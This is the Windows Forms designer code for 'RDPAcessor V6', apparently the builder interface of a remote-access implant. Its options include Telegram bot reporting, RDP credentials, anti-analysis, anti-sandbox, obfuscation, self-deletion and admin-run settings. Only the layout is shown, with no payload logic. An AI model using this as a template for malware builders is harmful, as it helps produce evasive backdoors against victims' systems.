
namespace RDPAcessor
{
    partial class RMain
    {
        /// <summary>
        /// Обязательная переменная конструктора.
        /// </summary>
        private System.ComponentModel.IContainer components = null;

        /// <summary>
        /// Освободить все используемые ресурсы.
        /// </summary>
        /// <param name="disposing">истинно, если управляемый ресурс должен быть удален; иначе ложно.</param>
        protected override void Dispose(bool disposing)
        {
            if (disposing && (components != null))
            {
                components.Dispose();
            }
            base.Dispose(disposing);
        }

        #region Код, автоматически созданный конструктором форм Windows

        /// <summary>
        /// Требуемый метод для поддержки конструктора — не изменяйте 
        /// содержимое этого метода с помощью редактора кода.
        /// </summary>
        private void InitializeComponent()
        {
            this.components = new System.ComponentModel.Container();
            System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(RMain));
            this.CloseBtn = new System.Windows.Forms.PictureBox();
            this.MinimazeBtn = new System.Windows.Forms.PictureBox();
            this.pictureBox1 = new System.Windows.Forms.PictureBox();
            this.label1 = new System.Windows.Forms.Label();
            this.label2 = new System.Windows.Forms.Label();
            this.groupBox1 = new System.Windows.Forms.GroupBox();
            this.RandStrGenBtn = new System.Windows.Forms.Button();
            this.label6 = new System.Windows.Forms.Label();
            this.MutexValue_Box = new System.Windows.Forms.TextBox();
            this.label4 = new System.Windows.Forms.Label();
            this.label3 = new System.Windows.Forms.Label();
            this.Chatid_Box = new System.Windows.Forms.TextBox();
            this.BotToken_Box = new System.Windows.Forms.TextBox();
            this.groupBox2 = new System.Windows.Forms.GroupBox();
            this.RdpPasswordBox = new System.Windows.Forms.TextBox();
            this.label7 = new System.Windows.Forms.Label();
            this.label5 = new System.Windows.Forms.Label();
            this.RdpUsernameBox = new System.Windows.Forms.TextBox();
            this.ResetBtn = new System.Windows.Forms.Button();
            this.RunAsAdminChk = new System.Windows.Forms.CheckBox();
            this.MeltFileChk = new System.Windows.Forms.CheckBox();
            this.MutexControlChk = new System.Windows.Forms.CheckBox();
            this.AntiAnyRunChk = new System.Windows.Forms.CheckBox();
            this.AntiAnalysisChk = new System.Windows.Forms.CheckBox();
            this.ObfuscateChk = new System.Windows.Forms.CheckBox();
            this.BuildBtn = new System.Windows.Forms.Button();
            this.SelectAssemblyChk = new System.Windows.Forms.Button();
            this.SelectIconBtn = new System.Windows.Forms.Button();
            this.IconBox = new System.Windows.Forms.PictureBox();
            this.panel1 = new System.Windows.Forms.Panel();
            this.StatusLabel = new System.Windows.Forms.Label();
            this.DateTime = new System.Windows.Forms.Timer(this.components);
            this.TimeLabel = new System.Windows.Forms.Label();
            ((System.ComponentModel.ISupportInitialize)(this.CloseBtn)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.MinimazeBtn)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox1)).BeginInit();
            this.groupBox1.SuspendLayout();
            this.groupBox2.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.IconBox)).BeginInit();
            this.panel1.SuspendLayout();
            this.SuspendLayout();
            // 
            // CloseBtn
            // 
            this.CloseBtn.Cursor = System.Windows.Forms.Cursors.Hand;
            this.CloseBtn.Image = global::RDPAcessor.Properties.Resources.Close;
            this.CloseBtn.Location = new System.Drawing.Point(263, 4);
            this.CloseBtn.Name = "CloseBtn";
            this.CloseBtn.Size = new System.Drawing.Size(25, 25);
            this.CloseBtn.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
            this.CloseBtn.TabIndex = 0;
            this.CloseBtn.TabStop = false;
            this.CloseBtn.Click += new System.EventHandler(this.CloseBtn_Click);
            // 
            // MinimazeBtn
            // 
            this.MinimazeBtn.Cursor = System.Windows.Forms.Cursors.Hand;
            this.MinimazeBtn.Image = global::RDPAcessor.Properties.Resources.Minimaze;
            this.MinimazeBtn.Location = new System.Drawing.Point(232, 4);
            this.MinimazeBtn.Name = "MinimazeBtn";
            this.MinimazeBtn.Size = new System.Drawing.Size(25, 25);
            this.MinimazeBtn.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
            this.MinimazeBtn.TabIndex = 1;
            this.MinimazeBtn.TabStop = false;
            this.MinimazeBtn.Click += new System.EventHandler(this.MinimazeBtn_Click);
            // 
            // pictureBox1
            // 
            this.pictureBox1.Cursor = System.Windows.Forms.Cursors.Arrow;
            this.pictureBox1.Image = global::RDPAcessor.Properties.Resources.Logo;
            this.pictureBox1.Location = new System.Drawing.Point(12, 4);
            this.pictureBox1.Name = "pictureBox1";
            this.pictureBox1.Size = new System.Drawing.Size(44, 44);
            this.pictureBox1.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
            this.pictureBox1.TabIndex = 2;
            this.pictureBox1.TabStop = false;
            // 
            // label1
            // 
            this.label1.AutoSize = true;
            this.label1.Font = new System.Drawing.Font("Franklin Gothic Medium", 8.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(204)));
            this.label1.ForeColor = System.Drawing.Color.White;
            this.label1.Location = new System.Drawing.Point(65, 9);
            this.label1.Name = "label1";
            this.label1.Size = new System.Drawing.Size(94, 15);
            this.label1.TabIndex = 3;
            this.label1.Text = "RDPAcessor V6";
            // 
            // label2
            // 
            this.label2.AutoSize = true;
            this.label2.Font = new System.Drawing.Font("Franklin Gothic Medium", 8.25F, System.Drawing.FontStyle.Underline, System.Drawing.GraphicsUnit.Point, ((byte)(204)));
            this.label2.ForeColor = System.Drawing.Color.White;
            this.label2.Location = new System.Drawing.Point(62, 24);
            this.label2.Name = "label2";
            this.label2.Size = new System.Drawing.Size(104, 30);
            this.label2.TabIndex = 4;
            this.label2.Text = "Easy access to RDP!\r\nBy k3rnel-dev\r\n";
            // 
            // groupBox1
            // 
            this.groupBox1.Controls.Add(this.RandStrGenBtn);
            this.groupBox1.Controls.Add(this.label6);
            this.groupBox1.Controls.Add(this.MutexValue_Box);
            this.groupBox1.Controls.Add(this.label4);
            this.groupBox1.Controls.Add(this.label3);
            this.groupBox1.Controls.Add(this.Chatid_Box);
            this.groupBox1.Controls.Add(this.BotToken_Box);
            this.groupBox1.Location = new System.Drawing.Point(12, 73);
            this.groupBox1.Name = "groupBox1";
            this.groupBox1.Size = new System.Drawing.Size(277, 177);
            this.groupBox1.TabIndex = 5;
            this.groupBox1.TabStop = false;
            // 
            // RandStrGenBtn
            // 
            this.RandStrGenBtn.BackColor = System.Drawing.Color.Cyan;
            this.RandStrGenBtn.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.RandStrGenBtn.Font = new System.Drawing.Font("Franklin Gothic Medium", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(204)));
            this.RandStrGenBtn.ForeColor = System.Drawing.Color.DarkCyan;
            this.RandStrGenBtn.Location = new System.Drawing.Point(234, 137);
            this.RandStrGenBtn.Name = "RandStrGenBtn";
            this.RandStrGenBtn.Size = new System.Drawing.Size(35, 24);
            this.RandStrGenBtn.TabIndex = 18;
            this.RandStrGenBtn.Text = "^^";
            this.RandStrGenBtn.UseVisualStyleBackColor = false;
            this.RandStrGenBtn.Click += new System.EventHandler(this.RandStrGenBtn_Click);
            // 
            // label6
            // 
            this.label6.AutoSize = true;
            this.label6.Font = new System.Drawing.Font("Franklin Gothic Medium", 8.25F, System.Drawing.FontStyle.Underline, System.Drawing.GraphicsUnit.Point, ((byte)(204)));
            this.label6.ForeColor = System.Drawing.Color.White;
            this.label6.Location = new System.Drawing.Point(6, 119);
            this.label6.Name = "label6";
            this.label6.Size = new System.Drawing.Size(190, 15);
            this.label6.TabIndex = 10;
            this.label6.Text = "Mutex-Value ( need enabled function )";
            // 
            // MutexValue_Box
            // 
            this.MutexValue_Box.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(30)))), ((int)(((byte)(30)))));
            this.MutexValue_Box.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
            this.MutexValue_Box.Enabled = false;
            this.MutexValue_Box.Font = new System.Drawing.Font("Franklin Gothic Medium", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(204)));
            this.MutexValue_Box.ForeColor = System.Drawing.Color.Cyan;
            this.MutexValue_Box.Location = new System.Drawing.Point(6, 137);
            this.MutexValue_Box.Multiline = true;
            this.MutexValue_Box.Name = "MutexValue_Box";
            this.MutexValue_Box.Size = new System.Drawing.Size(222, 24);
            this.MutexValue_Box.TabIndex = 9;
            this.MutexValue_Box.TextAlign = System.Windows.Forms.HorizontalAlignment.Center;
            // 
            // label4
            // 
            this.label4.AutoSize = true;
            this.label4.Font = new System.Drawing.Font("Franklin Gothic Medium", 8.25F, System.Drawing.FontStyle.Underline, System.Drawing.GraphicsUnit.Point, ((byte)(204)));
            this.label4.ForeColor = System.Drawing.Color.White;
            this.label4.Location = new System.Drawing.Point(6, 70);
            this.label4.Name = "label4";
            this.label4.Size = new System.Drawing.Size(42, 15);
            this.label4.TabIndex = 8;
            this.label4.Text = "Chat-ID";
            // 
            // label3
            // 
            this.label3.AutoSize = true;
            this.label3.Font = new System.Drawing.Font("Franklin Gothic Medium", 8.25F, System.Drawing.FontStyle.Underline, System.Drawing.GraphicsUnit.Point, ((byte)(204)));
            this.label3.ForeColor = System.Drawing.Color.White;
            this.label3.Location = new System.Drawing.Point(6, 23);
            this.label3.Name = "label3";
            this.label3.Size = new System.Drawing.Size(56, 15);
            this.label3.TabIndex = 7;
            this.label3.Text = "Token-Bot";
            // 
            // Chatid_Box
            // 
            this.Chatid_Box.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(30)))), ((int)(((byte)(30)))));
            this.Chatid_Box.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
            this.Chatid_Box.Font = new System.Drawing.Font("Franklin Gothic Medium", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(204)));
            this.Chatid_Box.ForeColor = System.Drawing.Color.Cyan;
            this.Chatid_Box.Location = new System.Drawing.Point(6, 88);
            this.Chatid_Box.Multiline = true;
            this.Chatid_Box.Name = "Chatid_Box";
            this.Chatid_Box.Size = new System.Drawing.Size(265, 24);
            this.Chatid_Box.TabIndex = 1;
            this.Chatid_Box.TextAlign = System.Windows.Forms.HorizontalAlignment.Center;
            // 
            // BotToken_Box
            // 
            this.BotToken_Box.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(30)))), ((int)(((byte)(30)))));
            this.BotToken_Box.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
            this.BotToken_Box.Font = new System.Drawing.Font("Franklin Gothic Medium", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(204)));
            this.BotToken_Box.ForeColor = System.Drawing.Color.Cyan;
            this.BotToken_Box.Location = new System.Drawing.Point(6, 41);
            this.BotToken_Box.Multiline = true;
            this.BotToken_Box.Name = "BotToken_Box";
            this.BotToken_Box.Size = new System.Drawing.Size(265, 24);
            this.BotToken_Box.TabIndex = 0;
            this.BotToken_Box.TextAlign = System.Windows.Forms.HorizontalAlignment.Center;
            // 
            // groupBox2
            // 
            this.groupBox2.Controls.Add(this.RdpPasswordBox);
            this.groupBox2.Controls.Add(this.label7);
            this.groupBox2.Controls.Add(this.label5);
            this.groupBox2.Controls.Add(this.RdpUsernameBox);
            this.groupBox2.Controls.Add(this.ResetBtn);
            this.groupBox2.Controls.Add(this.RunAsAdminChk);
            this.groupBox2.Controls.Add(this.MeltFileChk);
            this.groupBox2.Controls.Add(this.MutexControlChk);
            this.groupBox2.Controls.Add(this.AntiAnyRunChk);
            this.groupBox2.Controls.Add(this.AntiAnalysisChk);
            this.groupBox2.Controls.Add(this.ObfuscateChk);
            this.groupBox2.Controls.Add(this.BuildBtn);
            this.groupBox2.Controls.Add(this.SelectAssemblyChk);
            this.groupBox2.Controls.Add(this.SelectIconBtn);
            this.groupBox2.Controls.Add(this.IconBox);
            this.groupBox2.Location = new System.Drawing.Point(10, 256);
            this.groupBox2.Name = "groupBox2";
            this.groupBox2.Size = new System.Drawing.Size(278, 247);
            this.groupBox2.TabIndex = 6;
            this.groupBox2.TabStop = false;
            // 
            // RdpPasswordBox
            // 
            this.RdpPasswordBox.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(30)))), ((int)(((byte)(30)))));
            this.RdpPasswordBox.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
            this.RdpPasswordBox.Font = new System.Drawing.Font("Franklin Gothic Medium", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(204)));
            this.RdpPasswordBox.ForeColor = System.Drawing.Color.Cyan;
            this.RdpPasswordBox.Location = new System.Drawing.Point(182, 150);
            this.RdpPasswordBox.Multiline = true;
            this.RdpPasswordBox.Name = "RdpPasswordBox";
            this.RdpPasswordBox.Size = new System.Drawing.Size(83, 23);
            this.RdpPasswordBox.TabIndex = 21;
            this.RdpPasswordBox.TextAlign = System.Windows.Forms.HorizontalAlignment.Center;
            // 
            // label7
            // 
            this.label7.AutoSize = true;
            this.label7.Font = new System.Drawing.Font("Franklin Gothic Medium", 8.25F, System.Drawing.FontStyle.Underline, System.Drawing.GraphicsUnit.Point, ((byte)(204)));
            this.label7.ForeColor = System.Drawing.Color.White;
            this.label7.Location = new System.Drawing.Point(93, 152);
            this.label7.Name = "label7";
            this.label7.Size = new System.Drawing.Size(83, 15);
            this.label7.TabIndex = 20;
            this.label7.Text = "Password(RDP):";
            // 
            // label5
            // 
            this.label5.AutoSize = true;
            this.label5.Font = new System.Drawing.Font("Franklin Gothic Medium", 8.25F, System.Drawing.FontStyle.Underline, System.Drawing.GraphicsUnit.Point, ((byte)(204)));
            this.label5.ForeColor = System.Drawing.Color.White;
            this.label5.Location = new System.Drawing.Point(93, 123);
            this.label5.Name = "label5";
            this.label5.Size = new System.Drawing.Size(86, 15);
            this.label5.TabIndex = 19;
            this.label5.Text = "Username(RDP):";
            // 
            // RdpUsernameBox
            // 
            this.RdpUsernameBox.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(30)))), ((int)(((byte)(30)))));
            this.RdpUsernameBox.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
            this.RdpUsernameBox.Font = new System.Drawing.Font("Franklin Gothic Medium", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(204)));
            this.RdpUsernameBox.ForeColor = System.Drawing.Color.Cyan;
            this.RdpUsernameBox.Location = new System.Drawing.Point(182, 121);
            this.RdpUsernameBox.Multiline = true;
            this.RdpUsernameBox.Name = "RdpUsernameBox";
            this.RdpUsernameBox.Size = new System.Drawing.Size(83, 23);
            this.RdpUsernameBox.TabIndex = 19;
            this.RdpUsernameBox.TextAlign = System.Windows.Forms.HorizontalAlignment.Center;
            // 
            // ResetBtn
            // 
            this.ResetBtn.BackColor = System.Drawing.Color.Cyan;
            this.ResetBtn.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.ResetBtn.Font = new System.Drawing.Font("Franklin Gothic Medium", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(204)));
            this.ResetBtn.ForeColor = System.Drawing.Color.DarkCyan;
            this.ResetBtn.Location = new System.Drawing.Point(124, 87);
            this.ResetBtn.Name = "ResetBtn";
            this.ResetBtn.Size = new System.Drawing.Size(141, 28);
            this.ResetBtn.TabIndex = 17;
            this.ResetBtn.Text = "Reset all Values";
            this.ResetBtn.UseVisualStyleBackColor = false;
            this.ResetBtn.Click += new System.EventHandler(this.ResetBtn_Click);
            // 
            // RunAsAdminChk
            // 
            this.RunAsAdminChk.AutoSize = true;
            this.RunAsAdminChk.Font = new System.Drawing.Font("Franklin Gothic Medium", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(204)));
            this.RunAsAdminChk.ForeColor = System.Drawing.Color.White;
            this.RunAsAdminChk.Location = new System.Drawing.Point(11, 137);
            this.RunAsAdminChk.Name = "RunAsAdminChk";
            this.RunAsAdminChk.Size = new System.Drawing.Size(88, 19);
            this.RunAsAdminChk.TabIndex = 16;
            this.RunAsAdminChk.Text = "RunAsAdmin";
            this.RunAsAdminChk.UseVisualStyleBackColor = true;
            // 
            // MeltFileChk
            // 
            this.MeltFileChk.AutoSize = true;
            this.MeltFileChk.Font = new System.Drawing.Font("Franklin Gothic Medium", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(204)));
            this.MeltFileChk.ForeColor = System.Drawing.Color.White;
            this.MeltFileChk.Location = new System.Drawing.Point(11, 112);
            this.MeltFileChk.Name = "MeltFileChk";
            this.MeltFileChk.Size = new System.Drawing.Size(69, 19);
            this.MeltFileChk.TabIndex = 15;
            this.MeltFileChk.Text = "Melt-File";
            this.MeltFileChk.UseVisualStyleBackColor = true;
            // 
            // MutexControlChk
            // 
            this.MutexControlChk.AutoSize = true;
            this.MutexControlChk.Font = new System.Drawing.Font("Franklin Gothic Medium", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(204)));
            this.MutexControlChk.ForeColor = System.Drawing.Color.White;
            this.MutexControlChk.Location = new System.Drawing.Point(10, 87);
            this.MutexControlChk.Name = "MutexControlChk";
            this.MutexControlChk.Size = new System.Drawing.Size(94, 19);
            this.MutexControlChk.TabIndex = 14;
            this.MutexControlChk.Text = "Mutex-Control";
            this.MutexControlChk.UseVisualStyleBackColor = true;
            this.MutexControlChk.CheckedChanged += new System.EventHandler(this.MutexControlChk_CheckedChanged);
            // 
            // AntiAnyRunChk
            // 
            this.AntiAnyRunChk.AutoSize = true;
            this.AntiAnyRunChk.Font = new System.Drawing.Font("Franklin Gothic Medium", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(204)));
            this.AntiAnyRunChk.ForeColor = System.Drawing.Color.White;
            this.AntiAnyRunChk.Location = new System.Drawing.Point(10, 62);
            this.AntiAnyRunChk.Name = "AntiAnyRunChk";
            this.AntiAnyRunChk.Size = new System.Drawing.Size(86, 19);
            this.AntiAnyRunChk.TabIndex = 13;
            this.AntiAnyRunChk.Text = "Anti-AnyRun";
            this.AntiAnyRunChk.UseVisualStyleBackColor = true;
            // 
            // AntiAnalysisChk
            // 
            this.AntiAnalysisChk.AutoSize = true;
            this.AntiAnalysisChk.Font = new System.Drawing.Font("Franklin Gothic Medium", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(204)));
            this.AntiAnalysisChk.ForeColor = System.Drawing.Color.White;
            this.AntiAnalysisChk.Location = new System.Drawing.Point(10, 37);
            this.AntiAnalysisChk.Name = "AntiAnalysisChk";
            this.AntiAnalysisChk.Size = new System.Drawing.Size(89, 19);
            this.AntiAnalysisChk.TabIndex = 12;
            this.AntiAnalysisChk.Text = "Anti-Analysis";
            this.AntiAnalysisChk.UseVisualStyleBackColor = true;
            // 
            // ObfuscateChk
            // 
            this.ObfuscateChk.AutoSize = true;
            this.ObfuscateChk.Font = new System.Drawing.Font("Franklin Gothic Medium", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(204)));
            this.ObfuscateChk.ForeColor = System.Drawing.Color.White;
            this.ObfuscateChk.Location = new System.Drawing.Point(9, 14);
            this.ObfuscateChk.Name = "ObfuscateChk";
            this.ObfuscateChk.Size = new System.Drawing.Size(114, 19);
            this.ObfuscateChk.TabIndex = 11;
            this.ObfuscateChk.Text = "Simple Obfuscator";
            this.ObfuscateChk.UseVisualStyleBackColor = true;
            // 
            // BuildBtn
            // 
            this.BuildBtn.BackColor = System.Drawing.Color.Cyan;
            this.BuildBtn.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.BuildBtn.Font = new System.Drawing.Font("Liberation Sans", 15.75F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.BuildBtn.ForeColor = System.Drawing.Color.DarkCyan;
            this.BuildBtn.Location = new System.Drawing.Point(11, 191);
            this.BuildBtn.Name = "BuildBtn";
            this.BuildBtn.Size = new System.Drawing.Size(258, 41);
            this.BuildBtn.TabIndex = 10;
            this.BuildBtn.Text = "Build";
            this.BuildBtn.UseVisualStyleBackColor = false;
            this.BuildBtn.Click += new System.EventHandler(this.BuildBtn_Click);
            // 
            // SelectAssemblyChk
            // 
            this.SelectAssemblyChk.BackColor = System.Drawing.Color.Cyan;
            this.SelectAssemblyChk.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.SelectAssemblyChk.Font = new System.Drawing.Font("Franklin Gothic Medium", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(204)));
            this.SelectAssemblyChk.ForeColor = System.Drawing.Color.DarkCyan;
            this.SelectAssemblyChk.Location = new System.Drawing.Point(124, 53);
            this.SelectAssemblyChk.Name = "SelectAssemblyChk";
            this.SelectAssemblyChk.Size = new System.Drawing.Size(70, 28);
            this.SelectAssemblyChk.TabIndex = 9;
            this.SelectAssemblyChk.Text = "Assembly";
            this.SelectAssemblyChk.UseVisualStyleBackColor = false;
            this.SelectAssemblyChk.Click += new System.EventHandler(this.SelectAssemblyChk_Click);
            // 
            // SelectIconBtn
            // 
            this.SelectIconBtn.BackColor = System.Drawing.Color.Cyan;
            this.SelectIconBtn.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.SelectIconBtn.Font = new System.Drawing.Font("Franklin Gothic Medium", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(204)));
            this.SelectIconBtn.ForeColor = System.Drawing.Color.DarkCyan;
            this.SelectIconBtn.Location = new System.Drawing.Point(124, 19);
            this.SelectIconBtn.Name = "SelectIconBtn";
            this.SelectIconBtn.Size = new System.Drawing.Size(70, 28);
            this.SelectIconBtn.TabIndex = 8;
            this.SelectIconBtn.Text = "Icon";
            this.SelectIconBtn.UseVisualStyleBackColor = false;
            this.SelectIconBtn.Click += new System.EventHandler(this.SelectIconBtn_Click);
            // 
            // IconBox
            // 
            this.IconBox.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
            this.IconBox.Cursor = System.Windows.Forms.Cursors.Arrow;
            this.IconBox.Location = new System.Drawing.Point(200, 19);
            this.IconBox.Name = "IconBox";
            this.IconBox.Size = new System.Drawing.Size(65, 62);
            this.IconBox.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
            this.IconBox.TabIndex = 7;
            this.IconBox.TabStop = false;
            // 
            // panel1
            // 
            this.panel1.BackColor = System.Drawing.Color.Cyan;
            this.panel1.Controls.Add(this.StatusLabel);
            this.panel1.Dock = System.Windows.Forms.DockStyle.Bottom;
            this.panel1.Location = new System.Drawing.Point(0, 509);
            this.panel1.Name = "panel1";
            this.panel1.Size = new System.Drawing.Size(301, 22);
            this.panel1.TabIndex = 7;
            // 
            // StatusLabel
            // 
            this.StatusLabel.AutoSize = true;
            this.StatusLabel.Font = new System.Drawing.Font("Franklin Gothic Medium", 9.75F, System.Drawing.FontStyle.Underline, System.Drawing.GraphicsUnit.Point, ((byte)(204)));
            this.StatusLabel.ForeColor = System.Drawing.Color.Black;
            this.StatusLabel.Location = new System.Drawing.Point(2, 2);
            this.StatusLabel.Name = "StatusLabel";
            this.StatusLabel.Size = new System.Drawing.Size(69, 17);
            this.StatusLabel.TabIndex = 8;
            this.StatusLabel.Text = "Status: Idle";
            // 
            // DateTime
            // 
            this.DateTime.Enabled = true;
            this.DateTime.Tick += new System.EventHandler(this.DateTime_Tick);
            // 
            // TimeLabel
            // 
            this.TimeLabel.AutoSize = true;
            this.TimeLabel.Font = new System.Drawing.Font("Franklin Gothic Medium", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(204)));
            this.TimeLabel.ForeColor = System.Drawing.Color.White;
            this.TimeLabel.Location = new System.Drawing.Point(64, 43);
            this.TimeLabel.Name = "TimeLabel";
            this.TimeLabel.Size = new System.Drawing.Size(0, 15);
            this.TimeLabel.TabIndex = 8;
            // 
            // RMain
            // 
            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(30)))), ((int)(((byte)(30)))));
            this.ClientSize = new System.Drawing.Size(301, 531);
            this.ControlBox = false;
            this.Controls.Add(this.TimeLabel);
            this.Controls.Add(this.panel1);
            this.Controls.Add(this.groupBox2);
            this.Controls.Add(this.groupBox1);
            this.Controls.Add(this.label2);
            this.Controls.Add(this.label1);
            this.Controls.Add(this.pictureBox1);
            this.Controls.Add(this.MinimazeBtn);
            this.Controls.Add(this.CloseBtn);
            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
            this.Icon = ((System.Drawing.Icon)(resources.GetObject("$this.Icon")));
            this.Name = "RMain";
            this.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
            this.Text = "RDPAcessor V6";
            this.Load += new System.EventHandler(this.RMain_Load);
            this.MouseDown += new System.Windows.Forms.MouseEventHandler(this.RMain_MouseDown);
            this.MouseMove += new System.Windows.Forms.MouseEventHandler(this.RMain_MouseMove);
            this.MouseUp += new System.Windows.Forms.MouseEventHandler(this.RMain_MouseUp);
            ((System.ComponentModel.ISupportInitialize)(this.CloseBtn)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.MinimazeBtn)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox1)).EndInit();
            this.groupBox1.ResumeLayout(false);
            this.groupBox1.PerformLayout();
            this.groupBox2.ResumeLayout(false);
            this.groupBox2.PerformLayout();
            ((System.ComponentModel.ISupportInitialize)(this.IconBox)).EndInit();
            this.panel1.ResumeLayout(false);
            this.panel1.PerformLayout();
            this.ResumeLayout(false);
            this.PerformLayout();

        }

        #endregion

        private System.Windows.Forms.PictureBox CloseBtn;
        private System.Windows.Forms.PictureBox MinimazeBtn;
        private System.Windows.Forms.PictureBox pictureBox1;
        private System.Windows.Forms.Label label1;
        private System.Windows.Forms.Label label2;
        private System.Windows.Forms.GroupBox groupBox1;
        private System.Windows.Forms.GroupBox groupBox2;
        private System.Windows.Forms.Label label4;
        private System.Windows.Forms.Label label3;
        private System.Windows.Forms.TextBox Chatid_Box;
        private System.Windows.Forms.PictureBox IconBox;
        private System.Windows.Forms.Button BuildBtn;
        private System.Windows.Forms.Button SelectAssemblyChk;
        private System.Windows.Forms.Button SelectIconBtn;
        private System.Windows.Forms.Panel panel1;
        private System.Windows.Forms.Label StatusLabel;
        private System.Windows.Forms.CheckBox AntiAnyRunChk;
        private System.Windows.Forms.CheckBox AntiAnalysisChk;
        private System.Windows.Forms.CheckBox ObfuscateChk;
        private System.Windows.Forms.CheckBox RunAsAdminChk;
        private System.Windows.Forms.CheckBox MeltFileChk;
        private System.Windows.Forms.CheckBox MutexControlChk;
        private System.Windows.Forms.Label label6;
        private System.Windows.Forms.TextBox MutexValue_Box;
        private System.Windows.Forms.TextBox BotToken_Box;
        private System.Windows.Forms.Timer DateTime;
        private System.Windows.Forms.Label TimeLabel;
        private System.Windows.Forms.Button ResetBtn;
        private System.Windows.Forms.Button RandStrGenBtn;
        private System.Windows.Forms.TextBox RdpPasswordBox;
        private System.Windows.Forms.Label label7;
        private System.Windows.Forms.Label label5;
        private System.Windows.Forms.TextBox RdpUsernameBox;
    }
}

